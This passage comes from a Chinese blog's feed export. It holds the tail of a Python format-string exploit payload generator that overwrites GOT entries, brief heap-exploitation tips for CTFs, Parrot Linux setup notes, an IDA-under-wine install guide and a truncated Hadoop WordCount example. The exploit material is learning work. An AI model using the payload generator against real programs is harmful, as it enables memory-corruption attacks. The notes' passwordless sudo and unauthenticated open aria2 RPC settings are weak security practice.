<span class="title">offsetDeal</span><span class="params">(size)</span>:</span></span><br><span class="line">    length = <span class="number">12</span> * len(size)</span><br><span class="line">    <span class="keyword">if</span> length % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        offset = length / <span class="number">8</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        offset = length / <span class="number">8</span></span><br><span class="line">    length = offset * <span class="number">8</span> </span><br><span class="line">    offset += <span class="number">6</span></span><br><span class="line">    <span class="keyword">return</span> offset, length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payloadGenerate</span><span class="params">(size, offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[<span class="number">0</span>], offset)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(size)):</span><br><span class="line">        payload += <span class="string">"%&#123;&#125;c%&#123;&#125;$hhn"</span>.format(size[i]-size[i<span class="number">-1</span>],offset+i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">## 生成payload并对齐</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_payload</span><span class="params">(bewrite,  write， offset=<span class="number">0</span>)</span>:</span></span><br><span class="line">    part = Partion(write, bewrite)</span><br><span class="line">    size = sizeUp(part)</span><br><span class="line">    address = packAddr(part)</span><br><span class="line"></span><br><span class="line">    result = offsetDeal(size)</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        offset = result[<span class="number">0</span>]</span><br><span class="line">    length = result[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'offset is:'</span> + str(offset)</span><br><span class="line">    payload = payloadGenerate(size, offset)</span><br><span class="line">    </span><br><span class="line">    payload = payload.ljust(length, <span class="string">'a'</span>)</span><br><span class="line">    payload += address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = fmt_payload(exit_got,0x0000000000400626)</span></span><br><span class="line"><span class="comment"># payload = fmt_payload(exit_got,0x0000000000400626，10)</span></span><br></pre></td></tr></table></figure><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>写完后发觉，只适用于栈长度相对较大的，因为单字节写入的话，payload构造相对会比较长，所以是否还应该开个选项，双字节写入，四字节写入，不过那些是后话了，因为只需改改脚本就行了，编写脚本的目的只是为了更好的理解这个格式化字符串漏洞，理解他的整个过程，等我想到如何写通用payload，就是能设置长度的时候，在改进下。</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/7ec8b821/">https://noone-hub.github.io/posts/7ec8b821/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>格式化字符串</category>
      </categories>
      <tags>
        <tag>二进制,pwn,格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>比赛细节注意点</title>
    <url>/posts/c85295da/</url>
    <content><![CDATA[<h1 id="pwn-细节"><a href="#pwn-细节" class="headerlink" title="pwn_细节"></a>pwn_细节</h1><h2 id="partial-write"><a href="#partial-write" class="headerlink" title="partial write"></a>partial write</h2><p>保护全开情况下考虑部分覆盖，不要全部覆盖，开了pie后三位是固定的</p><h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>巧妙利用unsortbin可以在<strong>malloc_hook或者</strong>free_hook前伪造一个地址，造成错位攻击</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/c85295da/">https://noone-hub.github.io/posts/c85295da/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>细节</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>parrot linux问题解决</title>
    <url>/posts/ea44abbe/</url>
    <content><![CDATA[<h1 id="parot-linux系统问题总结"><a href="#parot-linux系统问题总结" class="headerlink" title="parot linux系统问题总结"></a>parot linux系统问题总结</h1><h2 id="出现命令行无法启动torbrowser-launcher"><a href="#出现命令行无法启动torbrowser-launcher" class="headerlink" title="出现命令行无法启动torbrowser-launcher"></a>出现命令行无法启动torbrowser-launcher</h2><p>这个问题我谷歌了很久，也没有得到有效的答案，所以只能自己动手测试，这是一个程序员基本功，我重新安装了好几次torbrowser-launcher，也没有得到解决，所以不是安装的问题，是机器环境的问题。</p><p>在我的parrot sercurity上出现的错误是这样的：<br><big>+ Tor Browser Launcher</big></p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><ul><li>By Micah Lee, licensed under MIT</li><li>version 0.3.1</li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pY2FoZmxlZS90b3Jicm93c2VyLWxhdW5jaGVy" title="https://github.com/micahflee/torbrowser-launcher">https://github.com/micahflee/torbrowser-launcher<i class="fa fa-external-link"></i></span></li><li>Launching Tor Browser.</li><li>Running /home/NoOne-hub/.local/share/torbrowser/tbb/x86_64/tor-browser_en-US/start-tor-browser.desktop</li><li>Launching ‘./Browser/start-tor-browser –detach’…</li><li>QFileSystemWatcher::removePaths: list is empty</li><li>QFileSystemWatcher::removePaths: list is empty</li></ul><p>解决方案可以直接往下划到底下，我先讲下处理这个问题思路<br>然后torbrowser-launcher没有启动,就这样就没了，我通过手动去官网下载了一波，解压后是可以运行的，然后将解压后的文件夹移动到tor默认位置那里，也就是上述出错的地方，tor浏览器居然运行不起来了，发现症结所在后，我创建了一个文件夹，然后将本身tor的文件夹移动到我新建的文件夹里，tor可以运行起来了，好吧，知道该怎么解决后就开始处理了</p><h3 id="处理方案"><a href="#处理方案" class="headerlink" title="处理方案"></a>处理方案</h3><p>直接移动后会报错，然后根据报错位置找到了<br><strong>/usr/lib/python3/dist-packages/torbrowser_launcher/</strong><br>这里有一堆py文件，然后经过手动探寻可以查到common.py里存放了位置信息，所以我将common.py里的 <strong>tbb_local = ‘{0}/.local/share/torbrowser/‘.format(homedir)</strong> 改成 <strong>tbb_local = ‘{0}/.local/share/torbrowser/test/‘.format(homedir)</strong><br>加多一层目录，然后命令行就可以完美启动了！</p><h2 id="出现软件无法启动问题"><a href="#出现软件无法启动问题" class="headerlink" title="出现软件无法启动问题"></a>出现软件无法启动问题</h2><p>删除沙盒里的配置文件就行，或者注释掉部分<br>/etc/firejail 存着对应软件的沙盒配置文件</p><h2 id="v2ray问题"><a href="#v2ray问题" class="headerlink" title="v2ray问题"></a>v2ray问题</h2><p>v2ray连不上有两个原因，<br>1.时间<br>2.配置文件，因为配置文件差了个流量控制的邮箱</p><p>时间问题可以安装ntpdate<br>sudo apt-get install ntpdate<br>sudo ntpdate 0.asia.pool.ntp.org</p><p>vi /etc/crontab<br>在末尾增加* */1 * * * ntpdate 0.asia.pool.ntp.org</p><p>同步到硬件<br>hwclock –systohc</p><h2 id="vmware问题"><a href="#vmware问题" class="headerlink" title="vmware问题"></a>vmware问题</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">VMWARE_VERSION=workstation-12.5.9</span><br><span class="line">TMP_FOLDER=/tmp/patch-vmware</span><br><span class="line">rm -fdr <span class="variable">$TMP_FOLDER</span></span><br><span class="line">mkdir -p <span class="variable">$TMP_FOLDER</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$TMP_FOLDER</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mkubecek/vmware-host-modules.git</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$TMP_FOLDER</span>/vmware-host-modules</span><br><span class="line">git checkout <span class="variable">$VMWARE_VERSION</span></span><br><span class="line">git fetch</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo rm /usr/lib/vmware/lib/libz.so.1/libz.so.1</span><br><span class="line">sudo ln -s /lib/x86_64-linux-gnu/libz.so.1 /usr/lib/vmware/lib/libz.so.1/libz.so.1</span><br><span class="line">sudo /etc/init.d/vmware restart</span><br></pre></td></tr></table></figure><h2 id="vimplus"><a href="#vimplus" class="headerlink" title="vimplus"></a>vimplus</h2><p>apt install vim-python-jedi<br>开机自启脚本</p><h2 id="双系统引导找回问题"><a href="#双系统引导找回问题" class="headerlink" title="双系统引导找回问题"></a>双系统引导找回问题</h2><p>进行live模式<br>先查看哪个是linux启动盘</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>然后挂载</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount /dev/sda2 /mnt</span><br><span class="line">mount --<span class="built_in">bind</span> /proc /mnt/proc</span><br><span class="line">mount --<span class="built_in">bind</span> /dev /mnt/dev</span><br><span class="line">mount --<span class="built_in">bind</span> /sys /mnt/sys</span><br><span class="line">chroot /mnt</span><br><span class="line">apt-get install grub-pc <span class="comment">#可有可无</span></span><br><span class="line">grub-mkconfig <span class="comment">#可有可无</span></span><br><span class="line">update-grub</span><br><span class="line">grub-install /dev/sda <span class="comment">#可有可无</span></span><br></pre></td></tr></table></figure><h2 id="aria2"><a href="#aria2" class="headerlink" title="aria2"></a>aria2</h2><p>sudo apt-get install aria2</p><p>/etc/aria2/aria2.conf</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用户名</span></span><br><span class="line"><span class="comment">#rpc-user=user</span></span><br><span class="line"><span class="comment">#密码</span></span><br><span class="line"><span class="comment">#rpc-passwd=passwd</span></span><br><span class="line"><span class="comment">#上面的认证方式不建议使用,建议使用下面的token方式</span></span><br><span class="line"><span class="comment">#设置加密的密钥</span></span><br><span class="line"><span class="comment">#rpc-secret=token</span></span><br><span class="line"><span class="comment">#允许rpc</span></span><br><span class="line"><span class="built_in">enable</span>-rpc=<span class="literal">true</span></span><br><span class="line"><span class="comment">#允许所有来源, web界面跨域权限需要</span></span><br><span class="line">rpc-allow-origin-all=<span class="literal">true</span></span><br><span class="line"><span class="comment">#允许外部访问，false的话只监听本地端口</span></span><br><span class="line">rpc-listen-all=<span class="literal">true</span></span><br><span class="line"><span class="comment">#RPC端口, 仅当默认端口被占用时修改</span></span><br><span class="line"><span class="comment">#rpc-listen-port=6800</span></span><br><span class="line"><span class="comment">#最大同时下载数(任务数), 路由建议值: 3</span></span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line"><span class="comment">#断点续传</span></span><br><span class="line"><span class="built_in">continue</span>=<span class="literal">true</span></span><br><span class="line"><span class="comment">#同服务器连接数</span></span><br><span class="line">max-connection-per-server=5</span><br><span class="line"><span class="comment">#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要</span></span><br><span class="line">min-split-size=10M</span><br><span class="line"><span class="comment">#单文件最大线程数, 路由建议值: 5</span></span><br><span class="line">split=10</span><br><span class="line"><span class="comment">#下载速度限制</span></span><br><span class="line">max-overall-download-limit=0</span><br><span class="line"><span class="comment">#单文件速度限制</span></span><br><span class="line">max-download-limit=0</span><br><span class="line"><span class="comment">#上传速度限制</span></span><br><span class="line">max-overall-upload-limit=0</span><br><span class="line"><span class="comment">#单文件速度限制</span></span><br><span class="line">max-upload-limit=0</span><br><span class="line"><span class="comment">#断开速度过慢的连接</span></span><br><span class="line"><span class="comment">#lowest-speed-limit=0</span></span><br><span class="line"><span class="comment">#验证用，需要1.16.1之后的release版本</span></span><br><span class="line"><span class="comment">#referer=*</span></span><br><span class="line"><span class="comment">#文件保存路径, 默认为当前启动位置</span></span><br><span class="line">dir=/Users/&lt;user_name&gt;/Downloads</span><br><span class="line"><span class="comment">#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本</span></span><br><span class="line"><span class="comment">#disk-cache=0</span></span><br><span class="line"><span class="comment">#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)</span></span><br><span class="line"><span class="comment">#enable-mmap=true</span></span><br><span class="line"><span class="comment">#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长</span></span><br><span class="line"><span class="comment">#所需时间 none &lt; falloc ? trunc « prealloc, falloc和trunc需要文件系统和内核支持</span></span><br><span class="line">file-allocation=prealloc</span><br></pre></td></tr></table></figure><p>/etc/init.d/aria2c</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides: aria2</span></span><br><span class="line"><span class="comment"># Required-Start: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Required-Stop: $remote_fs $network</span></span><br><span class="line"><span class="comment"># Default-Start: 2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop: 0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: Aria2 Downloader</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已开启Aria2c"</span></span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> -n <span class="string">"已关闭Aria2c"</span></span><br><span class="line"> killall aria2c</span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line"> </span><br><span class="line"> killall aria2c</span><br><span class="line"> sudo aria2c --conf-path=/etc/aria2/aria2.conf -D</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>谷歌插件</p><h2 id="sudo-设置不用密码"><a href="#sudo-设置不用密码" class="headerlink" title="sudo 设置不用密码"></a>sudo 设置不用密码</h2><p>%NoOne-hub ALL=(ALL) NOPASSWD: NOPASSWD:ALL</p><h2 id="阿里云docker加速镜像"><a href="#阿里云docker加速镜像" class="headerlink" title="阿里云docker加速镜像"></a>阿里云docker加速镜像</h2><p>vi /etc/docker/daemon.json</p><p>{<br>“registry-mirrors”: [“<span class="exturl" data-url="aHR0cHM6Ly9jci5jb25zb2xlLmFsaXl1bi5jb20vY24taGFuZ3pob3UvaW5zdGFuY2VzL21pcnJvcnMmcXVvdDtd" title="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors&quot;]">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors&quot;]<i class="fa fa-external-link"></i></span><br>}</p><h2 id="pip-换源"><a href="#pip-换源" class="headerlink" title="pip 换源"></a>pip 换源</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">cat &gt;&gt; ~/.pip/pip.conf &lt;&lt; EOF</span><br><span class="line">[global]</span><br><span class="line">index-url =  http://mirrors.aliyun.com/pypi/simple/ </span><br><span class="line">trusted-host = mirrors.aliyun.com</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h2 id="禁用虚拟网卡"><a href="#禁用虚拟网卡" class="headerlink" title="禁用虚拟网卡"></a>禁用虚拟网卡</h2><p>内网段冲突</p><p>ifconfig b47cab9fe564 down</p><h2 id="docker-存在依赖无法删除"><a href="#docker-存在依赖无法删除" class="headerlink" title="docker 存在依赖无法删除"></a>docker 存在依赖无法删除</h2><p>docker commit 容器id 名称<br>docker save -o 压缩包.tar 新镜像名称:latest</p><p>删除所有关于这个的镜像以及容易<br>docker load -i ./压缩包.tar</p><h2 id="wine依赖问题"><a href="#wine依赖问题" class="headerlink" title="wine依赖问题"></a>wine依赖问题</h2><p>删除winehq-stable的官方源，用parrot的源安装就可以了</p><h2 id="parrot-关闭更新提示"><a href="#parrot-关闭更新提示" class="headerlink" title="parrot 关闭更新提示"></a>parrot 关闭更新提示</h2><p>修改配置文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/xdg/autostart/parrot-updater.desktop</span><br></pre></td></tr></table></figure><p>文件内容如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env xdg-open</span></span><br><span class="line">[Desktop Entry]</span><br><span class="line">Name=System Updater</span><br><span class="line">Comment=Update reminder <span class="keyword">for</span> Parrot OS</span><br><span class="line">Icon=synaptic</span><br><span class="line">Exec=/usr/bin/update-reminder scheduled</span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=</span><br><span class="line">X-MATE-Autostart-enabled=<span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="配置文件导入导出"><a href="#配置文件导入导出" class="headerlink" title="配置文件导入导出"></a>配置文件导入导出</h2><p>dconf dump / &gt; dconf-settings.ini<br>dconf load / &lt; dconf-settings.ini</p><h2 id="耳机没声音，外放有声音"><a href="#耳机没声音，外放有声音" class="headerlink" title="耳机没声音，外放有声音"></a>耳机没声音，外放有声音</h2><p>重置下bios就行了</p><h2 id="c-编译32位"><a href="#c-编译32位" class="headerlink" title="c++ 编译32位"></a>c++ 编译32位</h2><p>g++-mulpilib</p><h2 id="gcc-编译静态链接"><a href="#gcc-编译静态链接" class="headerlink" title="gcc 编译静态链接"></a>gcc 编译静态链接</h2><p>gcc -static</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ea44abbe/">https://noone-hub.github.io/posts/ea44abbe/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ida7.2的安装</title>
    <url>/posts/475ebacd/</url>
    <content><![CDATA[<h1 id="论如何在linux上安装ida7-2以及安装插件"><a href="#论如何在linux上安装ida7-2以及安装插件" class="headerlink" title="论如何在linux上安装ida7.2以及安装插件"></a>论如何在linux上安装ida7.2以及安装插件</h1><p>序言：原来用ida pro7.0用了好久，听说ida新出了挺多新功能，又折腾了一天？太菜了，我只是想试试新功能而已，ida pro 7.2已经有插件可以同步反汇编程序和反编译程序视图，还有折腾了以前没折腾成的插件。其实最想的还是ida pro7.3,听说可以撤销。<br>我没找到ida pro7.2 linux版本，所以便用win下的替代了。linux下跑windows的软件，在我看来，首选就是wine了</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>这篇算是对我的那个环境配置的补充吧<br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNTc0OQ==" title="https://xz.aliyun.com/t/5749">环境配置篇<i class="fa fa-external-link"></i></span></p><h2 id="安装wine"><a href="#安装wine" class="headerlink" title="安装wine"></a>安装wine</h2><p>这里建议呢，安装winehq-stable版本<br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLndpbmVocS5vcmcvRG93bmxvYWQ=" title="https://wiki.winehq.org/Download">官网下载地址<i class="fa fa-external-link"></i></span></p><p>官网选后会有文档指示如何安装，这里我用的是debian发行版，所以我按我的来</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">wget -nc https://dl.winehq.org/wine-builds/winehq.key</span><br><span class="line">sudo apt-key add winehq.key</span><br></pre></td></tr></table></figure><p>然后添加源，这里位置不尽相同,自行添加了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://dl.winehq.org/wine-builds/debian/ buster main</span><br></pre></td></tr></table></figure><p>更新源</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install --install-recommends winehq-stable</span><br></pre></td></tr></table></figure><h2 id="下载ida-pro-7-2安装包"><a href="#下载ida-pro-7-2安装包" class="headerlink" title="下载ida pro 7.2安装包"></a>下载ida pro 7.2安装包</h2><p>这里相信各路神仙会有自己的办法的</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>这里假设安装包为ida.exe</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida.exe</span><br></pre></td></tr></table></figure><p>然后windows的安装操作各位会吧，一路next也可以，安装完会提示安装python，也安装<br>然后转到.wine目录下的ida目录下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/<span class="string">'Program Files'</span>/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>ls结果如下<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6go7eabbkj30f301gq2z.jpg" alt="20190829172100.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">'IDA 7.2'</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 ida64</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gobufrcmj30nj0h0abu.jpg" alt="20190829172516.png"><br>就运行成功了，到这里其实ida安装算完成了，可还要折腾插件啊，还有一些东西要折腾的可以参照<br><span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNTIyMDguaHRt" title="https://bbs.pediy.com/thread-252208.htm">看雪大佬的文章<i class="fa fa-external-link"></i></span><br>就是做些替换工作</p><p>对我来说方便的插件</p><ol><li>lazyida</li><li>findcrypt</li><li>HrDevHelper</li><li>IDASkins</li><li>hexlight<br>具体介绍可以从这里看到<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL29uZXRoYXd0L2lkYXBsdWdpbnMtbGlzdA==" title="https://github.com/onethawt/idaplugins-list">idaplugins-list<i class="fa fa-external-link"></i></span></li></ol><p>这里比较难装的就是findcrypt了，最主要他要自己装个python库，我原来的思路是从虚拟机共享文件夹，然后设置环境变量来pip install yara<br>现在我发觉更简单的方法了,先按照原来的方法到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wine64 easy_install-2.7.exe  yara</span><br><span class="line"><span class="built_in">cd</span> ~/.wine/drive_c/Python27/Scripts</span><br><span class="line">wine64 easy_install-2.7.exe  yara</span><br></pre></td></tr></table></figure><p>这样便安装成了</p><p>然后插件全放到ida7.2目录下的plugins里就成了<br>最终分享下界面</p><h2 id="界面share"><a href="#界面share" class="headerlink" title="界面share"></a>界面share</h2><ol><li><p>idaskin加hexlight高亮<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gotziju8j30rb0ipju8.jpg" alt="20190829174242.png"></p></li><li><p>HrDevHelper的树型图<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6govgs0voj317o0lsn1d.jpg" alt="20190829174408.png"></p></li><li><p>lazyida dump数据<br><img src="https://ws1.sinaimg.cn/large/007FmhgEgy1g6gox6396wj30fe02swef.jpg" alt="20190829174546.png"></p></li><li><p>至于findcrypt和lazyida的查找格式化字符串漏洞的就不截图了</p></li><li><p>dysnc我截图不了就算了，手机拍糊了点<br>最主要是要有一个好看的皮囊啊，我感觉这样配置下来比原来的好看多了</p></li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/475ebacd/">https://noone-hub.github.io/posts/475ebacd/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>环境</category>
      </categories>
      <tags>
        <tag>二进制，ida</tag>
      </tags>
  </entry>
  <entry>
    <title>大数据作业</title>
    <url>/posts/c690256a/</url>
    <content><![CDATA[<h1 id="hadoop1"><a href="#hadoop1" class="headerlink" title="hadoop1"></a>hadoop1</h1><p>建议执行前先打快照，我原来就是不知道怎么折腾把环境搞崩了，然后又折腾花了好久</p><p>java代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.util.GenericOptionsParser;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WordCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line">        String[] otherArgs = (<span class="keyword">new</span> GenericOptionsParser(conf, args)).getRemainingArgs();</span><br><span class="line">        <span class="keyword">if</span>(otherArgs.length &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            System.err.println(<span class="string">"Usage: wordcount &lt;in&gt; [&lt;in&gt;...] &lt;out&gt;"</span>);</span><br><span class="line">            System.exit(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Job job = Job.getInstance(conf, <span class="string">"word count"</span>);</span><br><span class="line">        job.setJarByClass(WordCount.class);</span><br><span class="line">        job.setMapperClass(WordCount.TokenizerMapper.class);</span><br><span class="line">        job.setCombinerClass(WordCount.IntSumReducer.class);</span><br><span class="line">        job.setReducerClass(WordCount.IntSumReducer.class);</span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(IntWritable.class); </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; otherArgs.length - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            FileInputFormat.addInputPath(job, <span class="keyword">new</span> Path(otherArgs[i]));</span><br><span class="line">        &#125;</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(otherArgs[otherArgs.length - <span class="number">1</span>]));</span><br><span class="line">        System.exit(job.waitForCompletion(<span class="keyword">true</span>)?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TokenizerMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> IntWritable one = <span class="keyword">new</span> IntWritable(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">private</span> Text word = <span class="keyword">new</span> Text();</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TokenizerMapper</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            StringTokenizer itr = <span class="keyword">new</span> StringTokenizer(value.toString()); </span><br><span class="line">            <span class="keyword">while</span>(itr.hasMoreTokens()) &#123;</span><br><span class="line">                <span class="keyword">this</span>.word.set(itr.nextToken());</span><br><span class="line">                context.write(<span class="keyword">this</span>.word, one);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">IntSumReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>, <span class="title">IntWritable</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> IntWritable result = <span class="keyword">new</span> IntWritable();</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">IntSumReducer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = 